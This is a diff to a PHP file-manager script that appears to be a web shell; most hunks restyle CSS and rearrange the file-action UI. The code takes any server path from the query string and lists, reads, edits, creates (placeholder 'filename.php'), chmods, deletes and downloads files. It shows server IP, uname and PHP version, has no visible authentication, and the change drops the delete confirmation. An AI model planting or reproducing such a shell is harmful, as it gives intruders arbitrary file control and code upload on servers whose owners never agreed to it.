@@ -60,7 +60,7 @@ textarea {
   	-moz-border-top-colors: none;
   	outline:none;
   	border-radius:6px;
-  	border:1px solid rgba(222,222,222,0.73);
+  	border:2px solid #e8e8e8;
   	background:rgba(222,222,222,0.73);
   	color:#8a8a8a;
 }
@@ -72,19 +72,20 @@ input[type=submit] {
   font-family: 'Ubuntu Mono', monospace;
   outline:none;
   color:#8a8a8a;
+  width:97%;
   font-weight: bold;
-  padding:7px;
+  padding:7px 2px;
   border-radius:6px;
-  border:1px solid rgba(222,222,222,0.73);
+  border:2px solid #e8e8e8;
   background:rgba(222,222,222,0.73);
 }
 input[type=text].action {
-	width:94%;
+	width:92%;
 	font-family: 'Ubuntu Mono', monospace;
 	padding:12px;
 	color:#8a8a8a;
 	border-radius:7px;
-	border: 1px solid #e8e8e8;
+	border:2px solid #e8e8e8;
 	outline:none;
 	background:#e8e8e8;
 }
@@ -116,6 +117,12 @@ li.action:first-child {
 	border-radius:7px 7px 0px 0px;
 }
 li.action:nth-child(2) {
+	border-top:none;
+}
+li.action:nth-child(3) {
+	border-top:none;
+}
+li.action:nth-child(4) {
 	border-top:none;
 }
 li.action:hover {
@@ -162,16 +169,77 @@ span.a {
 a.act {
 	border-radius:7px 0px 0px 7px; 
 }
-select, a.act {
+a.act {
+	margin-top:-9px;
 	background: #e8e8e8;
 	padding:3px 7px;
-	border:1px solid transparent;
+	border:2px solid rgba(222,222,222,0.73);
+	border-right:2px solid #e8e8e8;
 }
-select {
-	padding:4px;
-	color:#8a8a8a;
-	border-radius:0px 7px 7px 0px; 
-
+a.s {
+	margin-top:-9px;
+	border-radius:0px 7px 7px 0px;
+	border:2px solid rgba(222,222,222,0.73);
+}
+a.s:hover, 
+a.act:hover,
+input[type=submit]:hover {
+	border:2px solid #e87b7b;
+	border-right:2px solid #e87b7b;
+	cursor:pointer;
+}
+a.t:hover {
+	background:#e87b7b;
+	border:2px solid #e87b7b;
+	color:#fff;
+}
+a.acs:hover {
+	background:#e87b7b;
+	border:2px solid #e87b7b;
+	color:#fff;
+}
+a.so:hover {
+	color:#e87b7b;
+}
+a.su:hover {
+	color:#e39700;
+}
+textarea:focus,
+input[type=text].action:focus {
+	border:2px solid #e87b7b;
+}
+div.act {
+	background: #e8e8e8;
+	padding:7px;
+	width:97%;
+	height:60px;
+	text-align:left;
+	border-radius:7px;
+}
+div.asd {
+	height:345px;
+}
+a.acs {
+	margin-left:-12px;
+	background: #e8e8e8;
+	padding:3px 7px;
+	border:2px solid rgba(222,222,222,0.73);
+	border-left:2px solid #e8e8e8;
+}
+a.c {
+	background: #e8e8e8;
+	border:2px solid rgba(222,222,222,0.73);
+	border-radius:7px;
+	margin-top:-9px;
+	width:70px;
+	text-align: center;
+}
+a.l {
+	margin-left:-12px;
+	border-left:2px solid #e8e8e8;
+}
+tr.file:last-child {
+	border-bottom:none;
 }
 @media screen and (max-width: 600px) {
   table {
@@ -187,6 +255,9 @@ select {
 .strong {
 	font-size:12px;
 }
+div.act {
+	width:95.5%;
+}
 div.action {
 	width:100%;
 }
@@ -196,9 +267,12 @@ div.action_f {
 input[type=text].action {
 	width:91%;
 }
+input[type=submit] {
+	width:97%;
+}
 .k {
-	font-size:10px;
-	font-weight:bold;
+	float:right;
+	font-size:12px;
 }
   
   table thead {
@@ -210,6 +284,9 @@ input[type=text].action {
     width: 1px;
   }
   
+  td.perms {
+  	width:70px;
+  }
   table tr {
     border-radius:10px;
   }
@@ -225,11 +302,17 @@ input[type=text].action {
   th.pol, td.pol {
   	display:none;
   }
-  td.tol {
-  	
+  a.si {
+  	float:right;
   }
   .sa {
-  	font-size:10.5px;
+  	font-size:12px;
+  }
+  a.c, a.s, a.act {
+  	margin-top:-4px;
+  }
+  a.z {
+  	margin-left:10px;
   }
 </style>
 <body>
@@ -250,10 +333,10 @@ input[type=text].action {
 error_reporting();
 function cwd() {
   if (isset($_GET['path'])) {
-    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
+    $cwd = @str_replace('\\', '/', $_GET['path']);
     @chdir($cwd);
   } else {
-    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
+    $cwd = @str_replace('\\', '/', @getcwd());
   } return $cwd;
 }
 function perms($file) {
@@ -334,11 +417,6 @@ function size($file) {
 }
 if (@$_GET['action'] == 'path') {
 	?>
-	<thead>
-		<tr>
-			<th>ACTION</th>
-		</tr>
-	</thead>
 	<tr>
 		<td class="not">
 			<center>
@@ -362,16 +440,22 @@ if (@$_GET['action'] == 'path') {
 if (@$_GET['action'] == 'dir') {
 	$file = $_GET['file'];
 	?>
-	<thead>
-		<tr>
-			<th>ACTION</th>
-		</tr>
-	</thead>
 	<tr>
 		<td class="not">
 			<center>
 				<div class="action">
-					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
+					<div class="act">
+						<span class="a">
+							Dirname : <span><u><?=permission(cwd(),basename($file))?></u></span>
+						</span><br>
+						<span class="a">
+							Size : --
+						</span><br>
+						<span class="a">
+							Type : <?=mime_content_type($file)?>
+						</span>
+						<a class="b act c" href="?path=<?=cwd()?>">Back</a>
+					</div>
 					<ul class="action">
 						<li class="action"><a href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a></li>
 						<li class="action"><a href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a></li>
@@ -387,23 +471,32 @@ if (@$_GET['action'] == 'dir') {
 if (@$_GET['action'] == 'file') {
 	$file = $_GET['file'];
 	?>
-	<thead>
-		<tr>
-			<th>ACTION</th>
-		</tr>
-	</thead>
 	<tr>
 		<td class="not">
 			<center>
 				<div class="action">
-					<input class="action" type="text" name="" value="<?= $file ?>" readonly>
-					<ul class="action">
-						<li class="action"><a href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a></li>
-						<li class="action"><a href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a></li>
-						<li class="action"><a href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a></li>
-						<li class="action"><a href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a></li>
-						<li class="action"><a href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a></li>
-					</ul>
+					<div class="act asd">
+						<span class="a">
+							Filename : <span><u><?=permission(cwd(),basename($file))?></u></span>
+						</span><br>
+						<span class="a">
+							Size : <?=size($file)?>
+						</span><br>
+						<span class="a">
+							Type : <?=mime_content_type($file)?>
+						</span>
+						<center>
+						<a class="b act c z" href="?path=<?=cwd()?>">Back</a><br><p>
+						<a class="act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+						<a class="acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+						<a class="acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+						<a class="acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+						<a class="s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a><p>
+						<textarea readonly style="background:none;">
+							<?php print htmlspecialchars(file_get_contents(basename($file))) ?>
+						</textarea>
+						</center>
+					</div>
 				</div>
 			</center>
 		</td>
@@ -429,11 +522,8 @@ function makedir($dirname) {
 
 function makefile($file, $text) {
 	$handle = fopen(cwd().'/'.$file, "w");
-	if (fwrite($handle, $text)) {
-		print("success");
-	} else {
-		print("failed");
-	}
+	fwrite($handle, $text);
+	fclose($handle);
 }
 function changemode($file, $mode) {
 	if (chmod($file, $mode)) {
@@ -490,7 +580,9 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && (isset($_GET['download']))) 
 if (isset($_GET['makedir'])) {
 	if (isset($_POST['submit'])) {
 		if (makedir($_POST['dir'])) {
-			header("Location: ?path".cwd()."");
+			?>
+			<script type="text/javascript">window.location='?path=<?=cwd()?>'</script>
+			<?php
 		} else {
 			$alert = "failed";
 		}
@@ -514,7 +606,11 @@ if (isset($_GET['makedir'])) {
 }
 if (isset($_GET['makefile'])) {
 	if (isset($_POST['submit'])) {
-		makefile($_POST['file'], $_POST['text']);
+		if (makefile($_POST['file'], $_POST['text'])) {
+			$alert = alert("failed", "making file <u>".$_POST['file']."</u>");
+		} else {
+			$alert = alert("success", "making file <u>".$_POST['file']."</u>");
+		}
 	}
 	?>
 	<form method="post">
@@ -524,7 +620,7 @@ if (isset($_GET['makefile'])) {
 					<div class="action_f">
 						<input class="action" type="text" name="file" placeholder="filename.php"><br><br>
 						<textarea name="text" placeholder="put your script or text"></textarea><br><br>
-						<input style="width:100%;" type="submit" name="submit">
+						<input type="submit" name="submit">
 					</div>
 				</center>
 			</td>
@@ -544,8 +640,17 @@ if (isset($_GET['chmod'])) {
 			<td class="not">
 				<center>
 					<div class="action_f">
+						<div class="act">
+						<span class="a">Filename : <u><?= permission($file, basename($file)) ?></u></span><br>
+						<span class="a">Size : <?=size($file)?></span><br>
+						<span class="a">Type : <?=mime_content_type($file)?></span>
+						&nbsp;&nbsp;
+						<a class="b act s" href="?path=<?=cwd()?>&action=file&file=<?=$file?>">action</a>
+						<a class="b act" href="?path=<?=cwd()?>">back</a>
+						</div><br>
 						<input class="action" type="text" name="mode" value="<?=substr(sprintf("%o", fileperms($file)), -4)?>"><br><br>
 						<input style="width:100%;" type="submit" name="submit" value="CHANGE">
+					</div>
 					</div>
 				</center>
 			</td>
@@ -556,30 +661,9 @@ if (isset($_GET['chmod'])) {
 }
 if (isset($_GET['delete'])) {
 	$file = $_GET['file'];
-	if (isset($_GET['yes'])) {
-		if (delete($file)) {
-			header("Location: ?path=".cwd()."");
-		}
-	} if (isset($_GET['no'])) {
-		header("Location: ?path=".cwd()."");
+	if (delete($file)) {
+		@header("Location : ?path=".cwd()."");
 	}
-	?>
-	<form method="post">
-		<tr>
-			<td class="not">
-				<center>
-					<div class="action_f">
-						<span>You sure want delete this file 
-							<u><?=permission(cwd(), basename($file))?></u></span><br><br>
-						<a href="?path=<?=cwd()?>&delete&file=<?=$file?>&no">NO</a>
-						<a href="?path=<?=cwd()?>&delete&file=<?=$file?>&yes">YES</a>
-					</div>
-				</center>
-			</td>
-		</tr>
-	</form>
-	<?php
-	exit();
 }
 if (isset($_GET['rename'])) {
 	$file = $_GET['file'];
@@ -593,11 +677,20 @@ if (isset($_GET['rename'])) {
 	?>
 	<form method="post">
 		<tr>
-			<td>
+			<td class="not">
 				<center>
 					<div class="action_f">
+						<div class="act">
+						<span class="a">Filename : <u><?= permission($file, basename($file)) ?></u></span><br>
+						<span class="a">Size : <?=size($file)?></span><br>
+						<span class="a">Type : <?=mime_content_type($file)?></span>
+						&nbsp;&nbsp;
+						<a class="b act s" href="?path=<?=cwd()?>&action=file&file=<?=$file?>">action</a>
+						<a class="b act" href="?path=<?=cwd()?>">back</a>
+						</div><br>
 						<input class="action" type="text" name="newname" value="<?=basename($file)?>"><br><br>
 						<input style="width:100%;" type="submit" name="submit" value="RENAME">
+					</div>
 					</div>
 				</center>
 			</td>
@@ -620,23 +713,26 @@ if (isset($_GET['edit'])) {
 			<tr>
 				<td class="not">
 					<center>
+						<?=cwd()?>/
+					</center>
+				</td>
+			</tr>
+			<tr>
+				<td class="not">
+					<center>
 					<div class="action_f">
+						<div class="act">
 						<span class="a">Filename : <?= permission($file, basename($file)) ?></span><br>
 						<span class="a">Size : <?=size($file)?></span><br>
 						<span class="a">Type : <?=mime_content_type($file)?></span>
-						<select class="b" onclick="if (this.value) window.location=(this.value)">
-							<option value="" selected>Action</option>
-							<option value="?path=<?=cwd()?>&edit&file=<?=$file?>">Edit</option>
-							<option value="?path=<?=cwd()?>&rename&file=<?=$file?>">Rename</option>
-							<option value="?path=<?=cwd()?>&chmod&file=<?=$file?>">Chmod</option>
-							<option value="?path=<?=cwd()?>&delete&file=<?=$file?>">Delete</option>
-							<option value="?path=<?=cwd()?>&download&file=<?=$file?>">Download</option>
-						</select>&nbsp;&nbsp;
-						 <a class="b act" href="?path=<?=cwd()?>">Back</a>
-						<br><br>
+						&nbsp;&nbsp;
+						<a class="b act s" href="?path=<?=cwd()?>&action=file&file=<?=$file?>">action</a>
+						<a class="b act" href="?path=<?=cwd()?>">back</a>
+						</div><br>
 						<?=@$alert?>
 						<textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
 						<input style="width:100%;" type="submit" name="submit">
+					</div>
 					</div>
 					</center>
 				</td>
@@ -647,11 +743,13 @@ if (isset($_GET['edit'])) {
 }
 function get_server_info(){
     $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"];
-    $server_info['ip_adrress'] = "<span class='strong'>Server IP : ".$server_addr." | Your IP : ".$_SERVER['REMOTE_ADDR']."</span>";
-    $server_info['time_at_server'] = "<span class='strong'>Time @ Server : ".@date("d M Y H:i:s",time())."</span>";
-    $server_info['uname'] = "<span class='strong'>".php_uname()."</span>";
+    $server_info['ip_adrress'] = "<span class='strong'>Server IP : <span style='color:green;'>".$server_addr."</span> | 
+    							  Your IP : ".$_SERVER['REMOTE_ADDR']."</span>";
+    $server_info['time_at_server'] = "<span class='strong'>Time@Server : <span style='color:green;'>".@date("d M Y H:i:s",time())."</span></span>";
+    $server_info['uname'] = "<span class='strong' style='color:green;'>".php_uname()."</span>";
     $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'> | </span>":'';
-    $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";    
+    $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";  
+    $server_info['dir'] = "<span class='strong'><u>".cwd()."/</u></span>";
     return $server_info;
   }
 ?>
@@ -661,15 +759,15 @@ function get_server_info(){
   	foreach ($scandir as $dir) {
   		if (is_dir($dir)) {
   			if ($dir === '..') {
-  				$back = "<a class='sa' href='?path=".dirname(cwd())."'>".$dir."</a>";
+  				$back = "<a class='sa su' href='?path=".dirname(cwd())."'>".$dir."</a>";
   			} elseif($dir === '.') {
-  				$back = "<a class='sa' href='?path=".cwd()."'>".$dir."</a>";
+  				$back = "<a class='sa su' href='?path=".cwd()."'>".$dir."</a>";
   			} else {
-  				$back = "<a class='sa' href='?path=".cwd().'/'.$dir."'>".$dir."</a>";
+  				$back = "<a class='sa su' href='?path=".cwd().'/'.$dir."'>".$dir."</a>";
   			} if ($dir === '.' || $dir === '..') {
-  				$action = "<a class='sa' href='?path=".cwd()."&action=path'>action</a>";
+  				$action = "<a class='sa si' href='?path=".cwd()."&action=path'>action</a>";
   			} else {
-  				$action = '<a class="sa" href="?path='.cwd().'&action=dir&file='.cwd().'/'.$dir.'">action</a>';
+  				$action = '<a class="sa si" href="?path='.cwd().'&action=dir&file='.cwd().'/'.$dir.'">action</a>';
   			}
   			?>
   			<tr>
@@ -681,16 +779,16 @@ function get_server_info(){
   						<?= filetype(cwd().'/'.$dir) ?>
   					</center>
   				</td>
+  				<td>
+  					<center>
+  						<?= $action ?>
+  					</center>
+  				</td>
   				<td class="perms">
   					<center>
   						<span class="k">
   							<?= permission($dir, perms($dir)) ?>
   						</span>
-  					</center>
-  				</td>
-  				<td>
-  					<center>
-  						<?= $action ?>
   					</center>
   				</td>
   			</tr>
@@ -701,23 +799,21 @@ function get_server_info(){
   		if (is_file($file)) {
   			$files = cwd().'/'.$file
   			?>
-  			<tr>
-  				<td class="tol"><span class="sa"><?= basename($files) ?></span></td>
+  			<tr class="file">
+  				<td class="tol">
+  					<a class="sa so" href="?path=<?=cwd()?>&action=file&file=<?=$files?>"><?= basename($files) ?></a>
+  				</td>
   				<td class="pol">
   					<center><?= size($files); ?></center>
   				</td>
-  				<td class="perms">
+  				<td></td>
+  				<td class="perms" colspan="2">
   					<center>
   						<span class="k">
   							<?= permission($files, perms($files)) ?>
   						</span>
   					</center>
   				</td>
-      			<td>
-      				<center>
-      					<a class="sa" href="?path=<?=cwd()?>&action=file&file=<?=$files?>">action</a>
-      				</center>
-      			</td>
   			</tr>
   			<?php
   		}
